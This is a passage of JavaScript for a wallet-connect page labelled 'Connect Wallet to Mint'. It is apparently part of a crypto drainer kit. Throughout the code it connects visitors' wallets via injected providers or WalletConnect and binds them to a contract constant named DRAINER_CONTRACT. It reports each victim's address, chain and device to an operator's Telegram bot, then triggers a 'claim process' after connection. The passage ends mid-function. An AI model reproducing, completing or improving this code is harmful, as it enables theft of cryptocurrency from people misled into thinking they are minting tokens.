import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  CONFIG
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
  } = CONFIG;

  const PRIMARY_PROJECT_ID  = PROJECT_ID;
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;

  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  // FIX: WC v2 storage keys — must be cleared on hard disconnect or the SDK
  //      resurrects a zombie session on next init().
  const WC_STORAGE_PREFIXES = ['wc@2:', 'walletconnect', 'WCM_'];

  // ==========================================================================
  //  PLATFORM
  // ==========================================================================
  const UA = navigator.userAgent || '';
  const isMobileDevice  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  const getPlatform = () => {
    if (isIOSDevice) return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA)) return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  };

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  IN-WALLET BROWSER DETECTION
  //  FIX: Trust Wallet on iOS/Android exposes `window.ethereum` inside the
  //       in-app browser AND via WalletConnect. We must prefer the injected
  //       provider when we're literally inside Trust's browser — otherwise
  //       we create a WC session that Trust has to approve twice.
  // ==========================================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (!eth) return null;
    // Order matters: check specific flags first.
    if (eth.isTrust || eth.isTrustWallet || /TrustWallet/i.test(UA)) return { wallet: 'trust', name: 'Trust Wallet' };
    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
    if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (eth.isRabby || /Rabby/i.test(UA)) return { wallet: 'rabby', name: 'Rabby' };
    if (/Rainbow/i.test(UA)) return { wallet: 'rainbow', name: 'Rainbow' };
    return null;
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { console.error('[main.js] Telegram error:', await r.text()); return false; }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  LIBRARY LOADING
  // ==========================================================================
  function withTimeout(promise, ms, label) {
    return Promise.race([
      promise,
      new Promise((_, reject) => setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)),
    ]);
  }

  async function tryImport(urls, pickFn, label, timeoutMs = 8000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadWalletConnectLibraries() {
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    const modalCdn = [
      'https://esm.sh/@walletconnect/modal@2.6.2?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
    ];
    const web3Cdn = [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
    ];

    const [EthereumProvider, WalletConnectModal, Web3Mod] = await Promise.all([
      tryImport(providerCdn, (m) => m.EthereumProvider || m.default || m, 'EthereumProvider'),
      tryImport(modalCdn,    (m) => m.WalletConnectModal || m.default || m, 'Modal'),
      tryImport(web3Cdn,     (m) => m.default || m.Web3 || m, 'Web3'),
    ]);

    return { EthereumProvider, WalletConnectModal, Web3: Web3Mod.default || Web3Mod };
  }

  // ==========================================================================
  //  RELAY REACHABILITY
  // ==========================================================================
  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            const ws = new WebSocket(url);
            const t = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, timeoutMs);
            ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(true); };
            ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(false); };
          }),
          timeoutMs + 500,
          `ws-probe ${url}`
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch { /* try next */ }
    }
    logDebug('⚠️ No relay reachable — using default');
    return null;
  }

  // ==========================================================================
  //  DOM
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  STATE
  // ==========================================================================
  let EthereumProvider = null;
  let WalletConnectModal = null;
  let Web3Ctor = null;

  let wcProvider = null;
  let injectedProvider = null;
  let activeProvider = null;
  let web3Instance = null;
  let contractInstance = null;
  let isConnecting = false;
  let isDisconnecting = false;
  let connectionMode = null;
  let wcInitPromise = null; // FIX: serialize init() so we never create two SignClients

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';
    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE
  // ==========================================================================
  const LS = { addr: 'connectedWallet', mode: 'connectionMode' };
  const saveWallet = (address, mode) => {
    localStorage.setItem(LS.addr, address);
    if (mode) localStorage.setItem(LS.mode, mode);
  };
  const getSavedWallet = () => localStorage.getItem(LS.addr);
  const getSavedMode   = () => localStorage.getItem(LS.mode);
  const clearSavedWallet = () => {
    localStorage.removeItem(LS.addr);
    localStorage.removeItem(LS.mode);
  };

  // FIX: Wipe WC's own persisted session keys. Without this, a "disconnect"
  //      leaves a zombie session that the SDK tries to restore on reload,
  //      causing Trust Wallet to say "already connected" and refuse re-approval.
  function clearWCSessionStorage() {
    try {
      const toRemove = [];
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        if (!k) continue;
        if (WC_STORAGE_PREFIXES.some((p) => k.startsWith(p))) toRemove.push(k);
      }
      toRemove.forEach((k) => localStorage.removeItem(k));
      // Also clear IndexedDB used by WC core
      if (window.indexedDB?.databases) {
        window.indexedDB.databases().then((dbs) => {
          dbs.forEach((db) => {
            if (db.name && /walletconnect|wc@/i.test(db.name)) {
              try { window.indexedDB.deleteDatabase(db.name); } catch {}
            }
          });
        }).catch(() => {});
      }
      logDebug(`🧹 Cleared ${toRemove.length} WC storage keys`);
    } catch (e) { logDebug('WC storage clear err: ' + e.message); }
  }

  // ==========================================================================
  //  GLOBAL PUBLISH
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      mode: connectionMode,
      publishedAt: Date.now(),
    };
    logDebug(`publishGlobal: addr=${address} mode=${connectionMode} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
🧩 <b>Mode:</b> ${connectionMode || 'unknown'}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    connectionMode = null;
    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px'; i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  WALLETCONNECT INIT
  //  FIX: A single shared init promise prevents two SignClients.
  //       We also wait for `.session`/`.accounts` to hydrate.
  // ==========================================================================
  async function initWalletConnect({ useFallbackId = false } = {}) {
    // If a live provider with a live session already exists, reuse it.
    if (wcProvider) {
      if (wcProvider.session || wcProvider.accounts?.length) {
        logDebug('♻️ Reusing live WC provider');
        return wcProvider;
      }
      // Stale provider with no session — tear it down and rebuild.
      logDebug('♻️ Discarding stale WC provider');
      try { wcProvider.removeAllListeners?.(); } catch {}
      wcProvider = null;
    }

    // Serialize concurrent init() calls.
    if (wcInitPromise) {
      logDebug('⏳ Waiting for in-flight WC init');
      return wcInitPromise;
    }

    wcInitPromise = (async () => {
      const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
      if (!projectId) {
        logDebug('❌ No WalletConnect projectId configured');
        return null;
      }

      try {
        const relayUrl = await pickRelayUrl();
        logDebug(`WC init: projectId=${String(projectId).slice(0, 8)}…`);
        const t0 = performance.now();

        const opts = {
          projectId,
          chains: [MAINNET_ID],
          optionalChains: [MAINNET_ID],
          showQrModal: false,
          methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_sign'],
          events: ['chainChanged', 'accountsChanged'],
          metadata: DAPP_METADATA,
        };
        if (relayUrl) opts.relayUrl = relayUrl;

        const provider = await withTimeout(
          EthereumProvider.init(opts),
          15000,
          'EthereumProvider.init'
        );

        attachWCProviderEvents(provider);
        logDebug(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);
        return provider;
      } catch (e) {
        logDebug(`WC init failed: ${e.message}`);
        return null;
      } finally {
        wcInitPromise = null;
      }
    })();

    wcProvider = await wcInitPromise;
    return wcProvider;
  }

  // ==========================================================================
  //  WALLETCONNECT EVENTS
  //  FIX: Do NOT hardDisconnect on empty accountsChanged. WalletConnect emits
  //       this transiently during session setup on some wallets. Instead, we
  //       wait for the session to settle and only tear down on explicit
  //       session_delete / disconnect.
  // ==========================================================================
  function attachWCProviderEvents(provider) {
    if (!provider || provider.__apexEventsAttached) return;
    provider.__apexEventsAttached = true;

    provider.on('accountsChanged', (accounts) => {
      logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts || accounts.length === 0) {
        // Transient — check if a session still exists before tearing down.
        setTimeout(() => {
          if (!provider.session && (!provider.accounts || provider.accounts.length === 0)) {
            logDebug('WC accounts empty + no session → disconnecting');
            hardDisconnect({ skipWalletCall: true });
          }
        }, 1500);
        return;
      }
      const a = accounts[0];
      saveWallet(a, 'walletconnect');
      activeProvider = provider;
      connectionMode = 'walletconnect';
      if (!web3Instance) web3Instance = new Web3Ctor(provider);
      if (!contractInstance) contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      updateConnectedUI(a, 'evm');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 800);
    });

    provider.on('chainChanged', (id) => {
      logDebug(`WC chainChanged: ${id}`);
      showStatus(`Network changed to ${id}`, 'info');
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', (reason) => {
      logDebug(`WC disconnect: ${reason}`);
      hardDisconnect({ skipWalletCall: true });
    });

    provider.on('session_delete', () => {
      logDebug('WC session_delete');
      hardDisconnect({ skipWalletCall: true });
    });
  }

  // ==========================================================================
  //  INJECTED EVM
  // ==========================================================================
  function attachInjectedEvents(provider) {
    if (!provider || !provider.on || provider.__apexInjectedEvents) return;
    provider.__apexInjectedEvents = true;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        hardDisconnect({ skipWalletCall: true });
      } else {
        const a = accounts[0];
        saveWallet(a, 'injected');
        updateConnectedUI(a, 'evm');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 800);
      }
    });

    provider.on('chainChanged', () => {
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', () => {
      hardDisconnect({ skipWalletCall: true });
    });
  }

  async function connectInjected() {
    setupEIP6963();
    // FIX: Wait longer so EIP-6963 announceProvider has time on Trust's
    //      in-app browser (it's slow on some Android WebViews).
    await new Promise((r) => setTimeout(r, 800));

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    // If we detected an in-wallet browser, prefer window.ethereum directly.
    if (inWallet && window.ethereum) {
      providers = [{ info: { name: inWallet.name, rdns: 'io.injected' }, provider: window.ethereum }];
    } else if (providers.length === 0 && window.ethereum) {
      providers = [{ info: { name: 'Injected', rdns: 'io.injected' }, provider: window.ethereum }];
    }
    if (providers.length === 0) return null;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info?.rdns === 'io.metamask' || /metamask/i.test(p.info?.name || '')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return null;
    }

    try {
      const provider = chosen.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        20000,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return null;

      const address = accounts[0];
      injectedProvider = provider;
      activeProvider = provider;
      connectionMode = 'injected';

      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'injected');
      attachInjectedEvents(provider);
      updateConnectedUI(address, 'evm');
      logDebug(`✅ Injected connected: ${address} (${chosen.info?.name || 'wallet'})`);
      return address;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return null;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT CONNECT
  //  FIX: The core rewrite. Trust Wallet's mobile flow is:
  //       1. enable() → SDK emits display_uri
  //       2. Our modal opens (desktop) OR Trust auto-deep-links (mobile)
  //       3. User approves in Trust
  //       4. SDK receives session, emits accountsChanged
  //       5. enable() promise resolves
  //      The bug: on mobile, enable() often resolves with accounts=[] BEFORE
  //      step 4 completes. We must therefore:
  //        - Not close the modal on enable() resolve alone
  //        - Wait for a non-empty accountsChanged OR session.settled
  //        - Use a timeout fallback
  // ==========================================================================
  async function connectWalletConnect({ useFallbackId = false } = {}) {
    const provider = await initWalletConnect({ useFallbackId });
    if (!provider) return null;

    // Rehydrated session (from a previous visit) — reuse directly.
    if (provider.session && provider.accounts?.length) {
      const a = provider.accounts[0];
      activeProvider = provider;
      connectionMode = 'walletconnect';
      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      saveWallet(a, 'walletconnect');
      updateConnectedUI(a, 'evm');
      logDebug(`♻️ WC session already live: ${a}`);
      return a;
    }

    // Set up modal for desktop QR display.
    let modalController = null;
    if (WalletConnectModal && !isMobileDevice) {
      try {
        modalController = new WalletConnectModal({
          projectId: useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID,
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '9999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
          },
          enableExplorer: true,
        });
      } catch (e) { logDebug('Modal init: ' + e.message); }
    }

    // Register URI listener.
    let uriShown = false;
    const onUri = (uri) => {
      if (uriShown) return;
      uriShown = true;
      logDebug(`WC display_uri: ${uri.slice(0, 60)}…`);
      try { modalController?.openModal({ uri }); } catch (e) { logDebug('openModal: ' + e.message); }
    };
    provider.on('display_uri', onUri);

    // Also listen for the session to settle (accounts become available).
    let settledResolve;
    const settled = new Promise((res) => { settledResolve = res; });
    const onAccounts = (accounts) => {
      if (accounts?.length) {
        logDebug(`WC accounts arrived: ${accounts[0]}`);
        settledResolve(accounts[0]);
      }
    };
    provider.on('accountsChanged', onAccounts);

    showStatus(isMobileDevice ? 'Opening Trust Wallet…' : 'Scan QR with your wallet…', 'info');

    let address = null;
    try {
      // enable() triggers pairing AND waits for approval.
      // On mobile we still may resolve before accounts arrive, so race it
      // against our `settled` promise and a timeout.
      const enablePromise = provider.enable().catch((e) => {
        logDebug('WC enable() threw: ' + e.message);
        return null;
      });

      address = await Promise.race([
        enablePromise.then((accts) => accts?.[0] || null),
        settled,
        new Promise((res) => setTimeout(() => res(null), isMobileDevice ? 90000 : 180000)),
      ]);
    } catch (e) {
      logDebug('WC connect error: ' + e.message);
    } finally {
      provider.removeListener?.('display_uri', onUri);
      provider.removeListener?.('accountsChanged', onAccounts);
      try { modalController?.closeModal(); } catch {}
    }

    if (!address) {
      // Last-ditch: check provider state directly.
      const fallbackAccts = provider.accounts || [];
      if (fallbackAccts.length) {
        address = fallbackAccts[0];
      } else if (provider.session?.namespaces?.eip155?.accounts?.length) {
        // Session has accounts in CAIP-10 format: eip155:1:0x...
        const caip = provider.session.namespaces.eip155.accounts[0];
        const parts = caip.split(':');
        if (parts.length === 3) address = parts[2];
      }
    }

    if (!address) {
      logDebug('❌ WC: no address after settle window');
      return null;
    }

    activeProvider = provider;
    connectionMode = 'walletconnect';
    web3Instance = new Web3Ctor(provider);
    contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

    saveWallet(address, 'walletconnect');
    updateConnectedUI(address, 'evm');
    logDebug(`✅ WC connected: ${address}`);
    return address;
  }

  // ==========================================================================
  //  HARD DISCONNECT
  //  FIX: Now also clears WC storage keys so the SDK can't resurrect a
  //       zombie session on reload.
  // ==========================================================================
  async function hardDisconnect({ skipWalletCall = false } = {}) {
    if (isDisconnecting) return;
    isDisconnecting = true;

    try {
      if (!skipWalletCall && connectionMode === 'walletconnect' && wcProvider) {
        try {
          if (wcProvider.session) {
            await Promise.race([
              wcProvider.disconnect(),
              new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 6000)),
            ]);
          }
        } catch (e) {
          logDebug('WC disconnect err: ' + e.message);
        }
      }

      if (connectionMode === 'injected' && injectedProvider?.request) {
        try {
          await injectedProvider.request({
            method: 'wallet_revokePermissions',
            params: [{ eth_accounts: {} }],
          }).catch(() => {});
        } catch {}
      }
    } finally {
      // Clean listeners to prevent stale closures firing.
      try { wcProvider?.removeAllListeners?.(); } catch {}

      wcProvider = null;
      wcInitPromise = null;
      injectedProvider = null;
      activeProvider = null;
      web3Instance = null;
      contractInstance = null;
      connectionMode = null;

      // FIX: also nuke WC's persisted keys.
      clearWCSessionStorage();

      resetConnectedUI();
      clearSavedWallet();
      isDisconnecting = false;
      logDebug('🔌 Disconnected');
    }
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  //  FIX: On mobile, prefer injected ONLY when we're sure we're inside a
  //       wallet browser. Otherwise, WalletConnect. We also removed the
  //       desktop-injected branch that could hijack normal desktop users
  //       who have MetaMask installed but want to pick a different wallet.
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let address = null;

    try {
      const inWallet = detectInWalletBrowser();

      if (inWallet && isMobileDevice) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        address = await connectInjected();
        // If injected fails inside a wallet browser, fall through to WC.
      }

      if (!address) {
        address = await connectWalletConnect({ useFallbackId: false });
      }
      if (!address && FALLBACK_PROJECT_ID && FALLBACK_PROJECT_ID !== PRIMARY_PROJECT_ID) {
        logDebug('Retrying WC with fallback projectId…');
        address = await connectWalletConnect({ useFallbackId: true });
      }
    } catch (e) {
      logDebug('connectWallet exception: ' + e.message);
    } finally {
      isConnecting = false;
    }

    if (address) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      showStatus('Connection failed or cancelled', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT DISPATCHER (public)
  // ==========================================================================
  async function disconnectWallet() {
    showStatus('Disconnecting…', 'info');
    await hardDisconnect();
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    if (isConnecting || isDisconnecting) return;
    const isConnected = !!activeProvider || !!getSavedWallet();
    if (isConnected) await disconnectWallet();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  //  FIX: Wait for `.session` to hydrate. `init()` returning doesn't guarantee
  //       the session is loaded yet — the storage adapter is async.
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedMode   = getSavedMode();
    if (!savedWallet) return;

    // WalletConnect restore
    if (savedMode === 'walletconnect' || !savedMode) {
      try {
        const provider = await initWalletConnect({ useFallbackId: false });
        if (provider) {
          // Wait up to 3s for session to hydrate.
          const deadline = Date.now() + 3000;
          while (Date.now() < deadline) {
            if (provider.session && provider.accounts?.length) {
              const a = provider.accounts[0];
              activeProvider = provider;
              connectionMode = 'walletconnect';
              web3Instance = new Web3Ctor(provider);
              contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
              saveWallet(a, 'walletconnect');
              updateConnectedUI(a, 'evm');
              logDebug(`♻️ WC session restored: ${a}`);
              return;
            }
            await new Promise((r) => setTimeout(r, 150));
